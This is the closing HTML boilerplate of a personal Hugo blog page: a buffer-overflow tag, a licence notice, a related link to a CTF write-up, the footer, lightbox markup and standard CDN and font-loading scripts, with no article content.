<a href=/tags/buffer-overflow/>Buffer Overflow</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg><span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/umcsctf-writeup/><div class=article-image><img src=/p/umcsctf-writeup/feature-umcs-ctf-2025.f17a4a941d02e4cba5ff8903e4b267b5_hu29242262a73c9ee95f0d5de12fe6bdef_702289_250x150_fill_box_smart1_3.png width=250 height=150 loading=lazy alt="Featured image of post UMCTF-Writeup" data-key=umcsctf-writeup data-hash="md5-8XpKlB0C5Mul/4kD5LJntQ=="></div><div class=article-details><h2 class=article-title>UMCTF-Writeup</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
2022 -
2025 Song's Blog</section><section class=powerby>Sing Sing Song Song<br>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.21.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script>
<script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>